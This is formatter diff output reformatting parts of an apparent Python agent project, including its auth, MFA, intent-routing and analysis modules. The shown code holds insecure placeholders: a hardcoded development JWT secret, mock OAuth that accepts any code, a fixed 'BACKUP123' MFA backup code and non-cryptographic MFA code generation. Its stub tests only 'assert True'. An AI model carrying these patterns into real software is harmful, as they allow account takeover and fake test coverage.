-                    "out of stock", "low stock", "inventory management",
-                    "stock level", "replenish"
+                    "inventory",
+                    "stock",
+                    "quantity",
+                    "reorder",
+                    "supply",
+                    "out of stock",
+                    "low stock",
+                    "inventory management",
+                    "stock level",
+                    "replenish",
                 ],
                 "target_agent": AgentType.LOGISTICS,
-                "confidence_boost": 0.2
+                "confidence_boost": 0.2,
             },
             IntentType.STRATEGY: {
                 "keywords": [
-                    "strategy", "plan", "business", "growth", "expansion",
-                    "strategic", "roadmap", "vision", "goals", "objectives",
-                    "business plan", "market strategy"
+                    "strategy",
+                    "plan",
+                    "business",
+                    "growth",
+                    "expansion",
+                    "strategic",
+                    "roadmap",
+                    "vision",
+                    "goals",
+                    "objectives",
+                    "business plan",
+                    "market strategy",
                 ],
                 "target_agent": AgentType.EXECUTIVE,
-                "confidence_boost": 0.2
+                "confidence_boost": 0.2,
             },
             IntentType.DECISION: {
                 "keywords": [
-                    "decision", "choose", "recommend", "suggest", "advice",
-                    "should i", "what should", "best option", "recommendation",
-                    "guidance", "help me decide"
+                    "decision",
+                    "choose",
+                    "recommend",
+                    "suggest",
+                    "advice",
+                    "should i",
+                    "what should",
+                    "best option",
+                    "recommendation",
+                    "guidance",
+                    "help me decide",
                 ],
                 "target_agent": AgentType.EXECUTIVE,
-                "confidence_boost": 0.2
-            }
+                "confidence_boost": 0.2,
+            },
         }
-    
-    async def recognize_intent(self, message: str, context: Optional[Dict[str, Any]] = None) -> IntentRecognitionResult:
+
+    async def recognize_intent(
+        self, message: str, context: Optional[Dict[str, Any]] = None
+    ) -> IntentRecognitionResult:
         """Recognize intent from user message."""
         try:
             message_lower = message.lower().strip()
-            
+
             # Calculate scores for each intent
             intent_scores = {}
             matched_keywords = {}
-            
+
             for intent_type, pattern in self.intent_patterns.items():
                 score = 0.0
                 keywords_found = []
-                
+
                 # Check for keyword matches
                 for keyword in pattern["keywords"]:
                     if keyword in message_lower:
                         score += 1.0
                         keywords_found.append(keyword)
-                
+
                 # Apply confidence boost if keywords found
                 if keywords_found:
                     score += pattern.get("confidence_boost", 0.0)
-                
+
                 # Normalize score by number of keywords
                 if pattern["keywords"]:
                     score = score / len(pattern["keywords"])
-                
+
                 intent_scores[intent_type] = score
                 matched_keywords[intent_type] = keywords_found
-            
+
             # Find the best intent
             if intent_scores:
                 best_intent = max(intent_scores.keys(), key=lambda k: intent_scores[k])
                 best_score = intent_scores[best_intent]
-                
+
                 # If no clear intent found, default to general
                 if best_score < 0.1:
                     best_intent = IntentType.GENERAL
                     best_score = 0.5
                     target_agent = AgentType.LIAISON
-                    reasoning = "No specific intent detected, routing to general liaison"
+                    reasoning = (
+                        "No specific intent detected, routing to general liaison"
+                    )
                     keywords_found = []
                 else:
                     target_agent = self.intent_patterns[best_intent]["target_agent"]
                     reasoning = f"Intent '{best_intent.value}' detected with confidence {best_score:.2f}"
                     keywords_found = matched_keywords[best_intent]
@@ -199,170 +277,192 @@
                 best_intent = IntentType.GENERAL
                 best_score = 0.5
                 target_agent = AgentType.LIAISON
                 reasoning = "Fallback to general intent"
                 keywords_found = []
-            
+
             result = IntentRecognitionResult(
                 intent=best_intent,
                 confidence=min(best_score, 1.0),
                 target_agent=target_agent,
                 reasoning=reasoning,
-                keywords_matched=keywords_found
-            )
-            
-            logger.info(f"Intent recognized: {result.intent.value} -> {result.target_agent.value} (confidence: {result.confidence:.2f})")
+                keywords_matched=keywords_found,
+            )
+
+            logger.info(
+                f"Intent recognized: {result.intent.value} -> {result.target_agent.value} (confidence: {result.confidence:.2f})"
+            )
             return result
-            
+
         except Exception as e:
             logger.error(f"Error recognizing intent: {e}")
             # Return safe fallback
             return IntentRecognitionResult(
                 intent=IntentType.GENERAL,
                 confidence=0.5,
                 target_agent=AgentType.LIAISON,
                 reasoning=f"Error in intent recognition: {str(e)}",
-                keywords_matched=[]
+                keywords_matched=[],
             )
 
 
 class AgentCommunicationProtocol:
     """Manages communication between liaison and complex agents."""
-    
+
     def __init__(self, agent_orchestrator=None):
         """Initialize the communication protocol."""
         self.orchestrator = agent_orchestrator
         self.intent_recognizer = IntentRecognizer()
         self.liaison_client = None
         self.complex_agent_clients = {}
-        
+
         logger.info("Agent Communication Protocol initialized")
-    
+
     async def initialize(self):
         """Initialize LLM clients for communication using unified gemma3:4b model."""
         try:
             # Initialize unified client for all agents (gemma3:4b)
             self.liaison_client = FlipSyncLLMFactory.create_liaison_client()
             logger.info("Unified liaison client initialized with gemma3:4b")
 
             # Initialize unified agent clients (all using gemma3:4b)
-            for agent_type in [AgentType.MARKET, AgentType.CONTENT, AgentType.LOGISTICS, AgentType.EXECUTIVE]:
-                self.complex_agent_clients[agent_type] = FlipSyncLLMFactory.create_complex_agent_client(agent_type.value)
-                logger.info(f"Unified agent client initialized for {agent_type.value} with gemma3:4b")
-
-            logger.info("All unified agent communication clients initialized successfully")
-            
+            for agent_type in [
+                AgentType.MARKET,
+                AgentType.CONTENT,
+                AgentType.LOGISTICS,
+                AgentType.EXECUTIVE,
+            ]:
+                self.complex_agent_clients[agent_type] = (
+                    FlipSyncLLMFactory.create_complex_agent_client(agent_type.value)
+                )
+                logger.info(
+                    f"Unified agent client initialized for {agent_type.value} with gemma3:4b"
+                )
+
+            logger.info(
+                "All unified agent communication clients initialized successfully"
+            )
+
         except Exception as e:
             logger.error(f"Error initializing agent communication clients: {e}")
             raise
-    
+
     async def route_to_agent(self, context: AgentRoutingContext) -> AgentResponse:
         """Route message to appropriate agent based on intent."""
         try:
             # Recognize intent if not already done
             if not context.intent_result:
                 context.intent_result = await self.intent_recognizer.recognize_intent(
-                    context.user_message, 
-                    context.metadata
+                    context.user_message, context.metadata
                 )
-            
+
             intent_result = context.intent_result
-            
+
             # Route based on target agent
             if intent_result.target_agent == AgentType.LIAISON:
                 return await self._handle_liaison_response(context)
             else:
                 return await self._handle_complex_agent_response(context)
-                
+
         except Exception as e:
             logger.error(f"Error routing to agent: {e}")
             return self._create_fallback_response(context.user_message, str(e))
-    
-    async def _handle_liaison_response(self, context: AgentRoutingContext) -> AgentResponse:
+
+    async def _handle_liaison_response(
+        self, context: AgentRoutingContext
+    ) -> AgentResponse:
         """Handle response using liaison agent (gemma3:4b)."""
         try:
             if not self.liaison_client:
                 await self.initialize()
-            
+
             # Create liaison system prompt (Phase 4 Enhancement)
             from fs_agt_clean.core.agents.agent_prompts import get_agent_system_prompt
+
             system_prompt = get_agent_system_prompt(AgentType.LIAISON)
-            
+
             # Generate response
             response = await self.liaison_client.generate_response(
-                prompt=context.user_message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=context.user_message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type="liaison",
                 confidence=0.8,
                 response_time=response.response_time,
                 metadata={
                     "model_used": response.model,
                     "provider": response.provider.value,
-                    "intent": context.intent_result.intent.value if context.intent_result else "general"
-                }
-            )
-            
+                    "intent": (
+                        context.intent_result.intent.value
+                        if context.intent_result
+                        else "general"
+                    ),
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error in liaison response: {e}")
             return self._create_fallback_response(context.user_message, str(e))
-    
-    async def _handle_complex_agent_response(self, context: AgentRoutingContext) -> AgentResponse:
+
+    async def _handle_complex_agent_response(
+        self, context: AgentRoutingContext
+    ) -> AgentResponse:
         """Handle response using complex agent (gemma3:4b)."""
         try:
             if not self.complex_agent_clients:
                 await self.initialize()
-            
+
             target_agent = context.intent_result.target_agent
             agent_client = self.complex_agent_clients.get(target_agent)
-            
+
             if not agent_client:
-                logger.warning(f"Complex agent client not available for {target_agent.value}, falling back to liaison")
+                logger.warning(
+                    f"Complex agent client not available for {target_agent.value}, falling back to liaison"
+                )
                 return await self._handle_liaison_response(context)
-            
+
             # Create specialized system prompt based on agent type
             system_prompt = self._get_agent_system_prompt(target_agent)
-            
+
             # Generate response
             response = await agent_client.generate_response(
-                prompt=context.user_message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=context.user_message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type=target_agent.value,
                 confidence=context.intent_result.confidence,
                 response_time=response.response_time,
                 metadata={
                     "model_used": response.model,
                     "provider": response.provider.value,
                     "intent": context.intent_result.intent.value,
-                    "keywords_matched": context.intent_result.keywords_matched
-                }
-            )
-            
+                    "keywords_matched": context.intent_result.keywords_matched,
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error in complex agent response: {e}")
             return self._create_fallback_response(context.user_message, str(e))
-    
+
     def _get_agent_system_prompt(self, agent_type: AgentType) -> str:
         """Get specialized system prompt for agent type (Phase 4 Enhancement)."""
         from fs_agt_clean.core.agents.agent_prompts import get_agent_system_prompt
+
         return get_agent_system_prompt(agent_type)
-    
+
     def _create_fallback_response(self, message: str, error: str = "") -> AgentResponse:
         """Create a fallback response when routing fails."""
         content = "I apologize, but I'm having trouble processing your request right now. Please try again or rephrase your question."
         if error:
             logger.error(f"Fallback response due to error: {error}")
-        
+
         return AgentResponse(
             content=content,
             agent_type="fallback",
             confidence=0.1,
             response_time=0.0,
-            metadata={"error": error, "fallback": True}
+            metadata={"error": error, "fallback": True},
         )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/agents/agent_communication.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/auth/social_providers.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/auth/social_providers.py	2025-06-19 04:03:47.869155+00:00
@@ -9,53 +9,55 @@
 from dataclasses import dataclass
 
 
 class SocialAuthError(Exception):
     """Exception raised for social authentication errors."""
+
     pass
 
 
 @dataclass
 class SocialAuthResponse:
     """Response from social authentication provider."""
+
     user_id: str
     email: str
     name: str
     picture: Optional[str] = None
     provider_specific: Optional[Dict[str, Any]] = None
 
 
 class SocialAuthService:
     """Service for handling social authentication."""
-    
+
     def __init__(self):
         """Initialize the social auth service."""
         pass
-    
+
     async def exchange_code(self, provider: str, code: str) -> SocialAuthResponse:
         """
         Exchange authorization code for user information.
-        
+
         Args:
             provider: Social provider name (google, facebook, etc.)
             code: Authorization code from provider
-            
+
         Returns:
             SocialAuthResponse with user information
-            
+
         Raises:
             SocialAuthError: If authentication fails
         """
         # This is a minimal implementation for compatibility
         # In production, this would integrate with actual OAuth providers
-        
+
         if not code:
             raise SocialAuthError("Authorization code is required")
-        
+
         # Mock response for testing
         return SocialAuthResponse(
             user_id=f"mock_user_{provider}",
             email=f"user@{provider}.com",
             name=f"Mock User from {provider}",
             picture=None,
-            provider_specific={"provider": provider, "code": code}
+            provider_specific={"provider": provider, "code": code},
         )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/auth/social_providers.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/auth/test_auth_manager.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/auth/test_auth_manager.py	2025-06-19 04:03:47.910680+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for auth_manager
 
 This module contains API/Services focused tests for the migrated auth_manager component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from auth_manager import *
+
 
 class TestAuthManagerAPIServices:
     """API/Services test class for auth_manager."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
--- /home/brend/Flipsync_Final/fs_agt_clean/core/api_client.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/api_client.py	2025-06-19 04:03:47.915945+00:00
@@ -2,17 +2,20 @@
 from typing import Dict, Optional
 
 # Optional dependencies
 try:
     import aiohttp
+
     AIOHTTP_AVAILABLE = True
 except ImportError:
     AIOHTTP_AVAILABLE = False
+
     # Create mock aiohttp for graceful fallback
     class MockClientSession:
         async def request(self, *args, **kwargs):
             raise RuntimeError("aiohttp not available")
+
         async def close(self):
             pass
 
     class MockAiohttp:
         ClientSession = MockClientSession
@@ -22,24 +25,28 @@
 
     aiohttp = MockAiohttp()
 
 try:
     from tenacity import retry, stop_after_attempt, wait_exponential
+
     TENACITY_AVAILABLE = True
 except ImportError:
     TENACITY_AVAILABLE = False
+
     # Create mock retry decorator
     def retry(*args, **kwargs):
         def decorator(func):
             return func
+
         return decorator
 
     def stop_after_attempt(*args):
         return None
 
     def wait_exponential(*args, **kwargs):
         return None
+
 
 "\nBase API client class providing common HTTP functionality.\n"
 
 
 class APIClient:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/auth/test_auth_manager.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/api_client.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/auth/test_auth_service.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/auth/test_auth_service.py	2025-06-19 04:03:48.005365+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from auth_service import *
+
 
 class TestAuthServiceAPIServices:
     """API/Services test class for auth_service."""
 
     def test_import(self):
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/auth/test_auth_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/auth/password_reset.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/auth/password_reset.py	2025-06-19 04:03:48.038689+00:00
@@ -1,6 +1,5 @@
-
 """
 password_reset.py - FALLBACK MIGRATION
 
 This file was migrated as part of the Flipsync clean-up project.
 WARNING: This is a fallback migration due to issues with the automated migration.
@@ -56,14 +55,16 @@
         Returns:
             str: Password reset token
         """
         # Generate a unique token ID
         jti = f"{PASSWORD_RESET_TOKEN_PREFIX}{str(uuid4())}"
-        
+
         # Set expiration time
-        expire = datetime.now(timezone.utc) + timedelta(hours=PASSWORD_RESET_TOKEN_EXPIRY_HOURS)
-        
+        expire = datetime.now(timezone.utc) + timedelta(
+            hours=PASSWORD_RESET_TOKEN_EXPIRY_HOURS
+        )
+
         # Create token data
         data = {
             "sub": user_id,
             "email": email,
             "scope": "password_reset",
@@ -75,24 +76,26 @@
         # Get secret key
         if self.auth_service.config.development_mode:
             secret = "development-jwt-secret-not-for-production-use"
         else:
             secret = await self.auth_service._get_secret()
-        
+
         # Encode token
-        token = jwt.encode(data, secret, algorithm=self.auth_service.config.jwt_algorithm)
-        
+        token = jwt.encode(
+            data, secret, algorithm=self.auth_service.config.jwt_algorithm
+        )
+
         # Store token in Redis
         await self.token_storage.store_token(
             TokenRecord(
                 jti=jti,
                 user_id=user_id,
                 expires_at=expire,
                 metadata={"scope": "password_reset", "email": email},
             )
         )
-        
+
         logger.info(f"Generated password reset token for user {user_id}")
         return token
 
     async def validate_reset_token(self, token: str) -> Tuple[bool, Optional[Dict]]:
         """Validate a password reset token.
@@ -107,32 +110,34 @@
             # Get secret key
             if self.auth_service.config.development_mode:
                 secret = "development-jwt-secret-not-for-production-use"
             else:
                 secret = await self.auth_service._get_secret()
-            
+
             # Decode token
             payload = jwt.decode(
                 token, secret, algorithms=[self.auth_service.config.jwt_algorithm]
             )
-            
+
             # Validate token type
             if payload.get("scope") != "password_reset":
                 logger.warning("Invalid token scope for password reset")
                 return False, None
-            
+
             # Check if token is revoked
             jti = payload.get("jti")
             if not jti:
                 logger.warning("Missing JTI in password reset token")
                 return False, None
-                
-            is_revoked = await self.auth_service._revocation_service.is_token_revoked(jti)
+
+            is_revoked = await self.auth_service._revocation_service.is_token_revoked(
+                jti
+            )
             if is_revoked:
                 logger.warning(f"Password reset token {jti} has been revoked")
                 return False, None
-            
+
             # Return validation result
             return True, payload
         except jwt.ExpiredSignatureError:
             logger.warning("Password reset token has expired")
             return False, None
@@ -156,21 +161,21 @@
             # Get secret key
             if self.auth_service.config.development_mode:
                 secret = "development-jwt-secret-not-for-production-use"
             else:
                 secret = await self.auth_service._get_secret()
-            
+
             # Decode token
             payload = jwt.decode(
                 token, secret, algorithms=[self.auth_service.config.jwt_algorithm]
             )
-            
+
             # Revoke token
             jti = payload.get("jti")
             if not jti:
                 logger.warning("Missing JTI in password reset token")
                 return False
-                
+
             return await self.auth_service._revocation_service.revoke_token(jti)
         except Exception as e:
             logger.error(f"Error revoking password reset token: {str(e)}")
             return False
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/auth/password_reset.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/config/__init__.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/config/__init__.py	2025-06-19 04:03:48.176255+00:00
@@ -9,11 +9,11 @@
     PerformanceSettings,
     get_agent_settings,
     get_approval_thresholds,
     get_performance_settings,
     is_agent_enabled,
-    get_agent_capabilities
+    get_agent_capabilities,
 )
 
 _config_instance = None
 
 
@@ -35,7 +35,7 @@
     "PerformanceSettings",
     "get_agent_settings",
     "get_approval_thresholds",
     "get_performance_settings",
     "is_agent_enabled",
-    "get_agent_capabilities"
+    "get_agent_capabilities",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/config/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/compliance/audit_logger.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/compliance/audit_logger.py	2025-06-19 04:03:48.218469+00:00
@@ -23,25 +23,23 @@
             log_to_file: Whether to log to a file
             log_file: Path to the log file
         """
         self.log_to_file = log_to_file
         self.log_file = log_file
-        
+
         # Set up file handler if needed
         if log_to_file:
             self.file_handler = logging.FileHandler(log_file)
             self.file_handler.setLevel(logging.INFO)
-            formatter = logging.Formatter(
-                "%(asctime)s - %(levelname)s - %(message)s"
-            )
+            formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
             self.file_handler.setFormatter(formatter)
-            
+
             # Create a separate logger for audit events
             self.audit_logger = logging.getLogger("security_audit")
             self.audit_logger.setLevel(logging.INFO)
             self.audit_logger.addHandler(self.file_handler)
-            
+
             # Make sure audit logger doesn't propagate to root logger
             self.audit_logger.propagate = False
 
     async def log_security_event(
         self,
@@ -64,14 +62,14 @@
             "event_type": event_type,
             "user_id": user_id,
             "ip_address": ip_address,
             "details": details or {},
         }
-        
+
         # Log the event
         event_json = json.dumps(event_data)
-        
+
         if self.log_to_file:
             self.audit_logger.info(event_json)
-        
+
         # Also log to application logger at debug level
         logger.debug(f"Security event: {event_json}")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/compliance/audit_logger.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/trend_analyzer.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/trend_analyzer.py	2025-06-19 04:03:48.370680+00:00
@@ -193,11 +193,13 @@
         # Combine both factors
         confidence = (r_squared * 0.7) + (p_factor * 0.3)
 
         return min(confidence, 1.0)
 
-    def _linear_regression(self, x: List[float], y: List[float]) -> Tuple[float, float, float, float, float]:
+    def _linear_regression(
+        self, x: List[float], y: List[float]
+    ) -> Tuple[float, float, float, float, float]:
         """
         Calculate linear regression statistics.
 
         Args:
             x: Independent variable values
@@ -399,17 +401,21 @@
         autocorr = []
         for lag in range(n):
             if lag == 0:
                 autocorr.append(1.0)
             else:
-                correlation = sum(centered[i] * centered[i - lag] for i in range(lag, n))
-                correlation /= (variance * (n - lag))
+                correlation = sum(
+                    centered[i] * centered[i - lag] for i in range(lag, n)
+                )
+                correlation /= variance * (n - lag)
                 autocorr.append(correlation)
 
         return autocorr
 
-    def _find_peaks(self, data: List[float], height: float = 0.1, distance: int = 2) -> List[int]:
+    def _find_peaks(
+        self, data: List[float], height: float = 0.1, distance: int = 2
+    ) -> List[int]:
         """
         Simple peak detection algorithm.
 
         Args:
             data: Data to find peaks in
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/trend_analyzer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/competitor_monitor.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/competitor_monitor.py	2025-06-19 04:03:48.383415+00:00
@@ -557,6 +557,6 @@
             # Significant drop followed by increase
             if current_change < -0.05 and next_change > 0.03:
                 patterns += 1
 
         # Need at least 2 promotional patterns
-        return patterns >= 2
\ No newline at end of file
+        return patterns >= 2
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/competitor_monitor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/auth/mfa_verification.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/auth/mfa_verification.py	2025-06-19 04:03:48.549269+00:00
@@ -1,6 +1,5 @@
-
 """
 mfa_verification.py - FALLBACK MIGRATION
 
 This file was migrated as part of the Flipsync clean-up project.
 WARNING: This is a fallback migration due to issues with the automated migration.
@@ -30,122 +29,140 @@
 logger = get_logger(__name__)
 
 
 class MfaVerificationType(str, Enum):
     """MFA verification types."""
+
     TOTP = "totp"
     SMS = "sms"
     EMAIL = "email"
     BACKUP = "backup"
 
 
 class MfaVerificationStatus(str, Enum):
     """MFA verification status."""
+
     PENDING = "pending"
     VERIFIED = "verified"
     FAILED = "failed"
     EXPIRED = "expired"
 
 
 class MfaVerificationRequest(BaseModel):
     """MFA verification request."""
+
     user_id: str = Field(..., description="User ID")
     verification_type: MfaVerificationType = Field(..., description="Verification type")
     code: str = Field(..., description="Verification code")
     session_id: Optional[str] = Field(None, description="Session ID")
 
 
 class MfaVerificationResponse(BaseModel):
     """MFA verification response."""
+
     success: bool = Field(..., description="Whether verification was successful")
     message: str = Field(..., description="Message describing the result")
-    remaining_attempts: Optional[int] = Field(None, description="Remaining verification attempts")
-    locked_until: Optional[datetime] = Field(None, description="Time until account is unlocked")
+    remaining_attempts: Optional[int] = Field(
+        None, description="Remaining verification attempts"
+    )
+    locked_until: Optional[datetime] = Field(
+        None, description="Time until account is unlocked"
+    )
     verification_type: MfaVerificationType = Field(..., description="Verification type")
     user_id: str = Field(..., description="User ID")
 
 
 class MfaVerificationManager:
     """
     Manager for MFA verification.
-    
+
     This class provides methods for verifying MFA codes and managing
     verification attempts.
     """
-    
+
     def __init__(
         self,
         mfa_service: MFAService,
         max_verification_attempts: int = 5,
         lockout_duration: int = 1800,  # 30 minutes
         verification_expiry: int = 300,  # 5 minutes
     ):
         """
         Initialize the MFA verification manager.
-        
+
         Args:
             mfa_service: MFA service for TOTP and backup code operations
             max_verification_attempts: Maximum number of verification attempts
             lockout_duration: Duration of lockout in seconds
             verification_expiry: Expiry time for verification codes in seconds
         """
         self.mfa_service = mfa_service
         self.max_verification_attempts = max_verification_attempts
         self.lockout_duration = lockout_duration
         self.verification_expiry = verification_expiry
-        
+
         # Store verification attempts
         self._verification_attempts: Dict[str, int] = {}
         self._lockout_times: Dict[str, datetime] = {}
-        
+
         # Store verification codes
         self._verification_codes: Dict[str, Dict[str, Union[str, datetime]]] = {}
-        
+
         logger.info("MFA verification manager initialized")
-    
-    def generate_verification_code(self, user_id: str, verification_type: MfaVerificationType) -> str:
+
+    def generate_verification_code(
+        self, user_id: str, verification_type: MfaVerificationType
+    ) -> str:
         """
         Generate a verification code for a user.
-        
+
         Args:
             user_id: User ID
             verification_type: Verification type
-            
+
         Returns:
             Verification code
         """
         import random
         import string
-        
+
         # Generate a random code
-        if verification_type == MfaVerificationType.SMS or verification_type == MfaVerificationType.EMAIL:
+        if (
+            verification_type == MfaVerificationType.SMS
+            or verification_type == MfaVerificationType.EMAIL
+        ):
             # Generate a 6-digit code for SMS/Email
             code = "".join(random.choices(string.digits, k=6))
         else:
             # For other types, use a longer alphanumeric code
             code = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        
+
         # Store the code with expiration time
         self._verification_codes[f"{user_id}:{verification_type}"] = {
             "code": code,
-            "expires_at": datetime.utcnow() + timedelta(seconds=self.verification_expiry),
+            "expires_at": datetime.utcnow()
+            + timedelta(seconds=self.verification_expiry),
         }
-        
+
         return code
-    
+
     def verify_code(
-        self, user_id: str, verification_type: MfaVerificationType, code: str, totp_secret: Optional[str] = None
+        self,
+        user_id: str,
+        verification_type: MfaVerificationType,
+        code: str,
+        totp_secret: Optional[str] = None,
     ) -> MfaVerificationResponse:
         """
         Verify a verification code.
-        
+
         Args:
             user_id: User ID
             verification_type: Verification type
             code: Verification code
             totp_secret: TOTP secret (required for TOTP verification)
-            
+
         Returns:
             Verification response
         """
         # Check if user is locked out
         if user_id in self._lockout_times:
@@ -160,31 +177,31 @@
                 )
             else:
                 # Lockout period has expired
                 del self._lockout_times[user_id]
                 self._verification_attempts[user_id] = 0
-        
+
         # Initialize verification attempts if not exists
         if user_id not in self._verification_attempts:
             self._verification_attempts[user_id] = 0
-        
+
         # Check verification attempts
         attempts = self._verification_attempts[user_id]
         if attempts >= self.max_verification_attempts:
             # Lock the account
             lockout_time = datetime.utcnow() + timedelta(seconds=self.lockout_duration)
             self._lockout_times[user_id] = lockout_time
-            
+
             return MfaVerificationResponse(
                 success=False,
                 message="Too many failed attempts. Account is locked.",
                 remaining_attempts=0,
                 locked_until=lockout_time,
                 verification_type=verification_type,
                 user_id=user_id,
             )
-        
+
         # Verify based on verification type
         success = False
         if verification_type == MfaVerificationType.TOTP:
             if not totp_secret:
                 return MfaVerificationResponse(
@@ -192,104 +209,109 @@
                     message="TOTP secret is required for TOTP verification",
                     remaining_attempts=self.max_verification_attempts - attempts,
                     verification_type=verification_type,
                     user_id=user_id,
                 )
-            
+
             success = self.mfa_service.verify_totp(totp_secret, code)
-        elif verification_type == MfaVerificationType.SMS or verification_type == MfaVerificationType.EMAIL:
+        elif (
+            verification_type == MfaVerificationType.SMS
+            or verification_type == MfaVerificationType.EMAIL
+        ):
             # Get stored code
             key = f"{user_id}:{verification_type}"
             if key not in self._verification_codes:
                 return MfaVerificationResponse(
                     success=False,
                     message=f"No {verification_type} verification code found",
                     remaining_attempts=self.max_verification_attempts - attempts,
                     verification_type=verification_type,
                     user_id=user_id,
                 )
-            
+
             stored_code_data = self._verification_codes[key]
             stored_code = stored_code_data["code"]
             expires_at = stored_code_data["expires_at"]
-            
+
             # Check if code is expired
             if datetime.utcnow() > expires_at:
                 # Remove expired code
                 del self._verification_codes[key]
-                
+
                 return MfaVerificationResponse(
                     success=False,
                     message=f"{verification_type.value.upper()} verification code has expired",
                     remaining_attempts=self.max_verification_attempts - attempts,
                     verification_type=verification_type,
                     user_id=user_id,
                 )
-            
+
             # Verify code
             success = stored_code == code
-            
+
             # Remove used code if successful
             if success:
                 del self._verification_codes[key]
         elif verification_type == MfaVerificationType.BACKUP:
             # In a real implementation, you would verify against stored backup codes
             # For now, we'll just use a placeholder
             success = code == "BACKUP123"
-        
+
         if success:
             # Reset verification attempts
             self._verification_attempts[user_id] = 0
-            
+
             return MfaVerificationResponse(
                 success=True,
                 message=f"{verification_type.value.upper()} code verified successfully",
                 remaining_attempts=self.max_verification_attempts,
                 verification_type=verification_type,
                 user_id=user_id,
             )
         else:
             # Increment verification attempts
             self._verification_attempts[user_id] += 1
-            
-            remaining_attempts = self.max_verification_attempts - self._verification_attempts[user_id]
-            
+
+            remaining_attempts = (
+                self.max_verification_attempts - self._verification_attempts[user_id]
+            )
+
             return MfaVerificationResponse(
                 success=False,
                 message=f"Invalid {verification_type.value.upper()} code",
                 remaining_attempts=remaining_attempts,
                 verification_type=verification_type,
                 user_id=user_id,
             )
-    
+
     def cleanup_expired_codes(self) -> int:
         """
         Clean up expired verification codes.
-        
+
         Returns:
             Number of codes removed
         """
         now = datetime.utcnow()
         expired_keys = [
             key
             for key, data in self._verification_codes.items()
             if now > data["expires_at"]
         ]
-        
+
         # Remove expired codes
         for key in expired_keys:
             del self._verification_codes[key]
-        
+
         return len(expired_keys)
-    
+
     def reset_verification_attempts(self, user_id: str) -> None:
         """
         Reset verification attempts for a user.
-        
+
         Args:
             user_id: User ID
         """
         if user_id in self._verification_attempts:
             del self._verification_attempts[user_id]
-        
+
         if user_id in self._lockout_times:
             del self._lockout_times[user_id]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/auth/mfa_verification.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/demand_forecaster.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/demand_forecaster.py	2025-06-19 04:03:48.602504+00:00
@@ -659,6 +659,6 @@
             total_forecast=0.0,
             growth_rate=0.0,
             forecast_accuracy=0.0,
             factors={},
             last_updated=datetime.now(),
-        )
\ No newline at end of file
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/demand_forecaster.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/auth/token_manager.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/auth/token_manager.py	2025-06-19 04:03:48.643068+00:00
@@ -1,6 +1,5 @@
-
 """
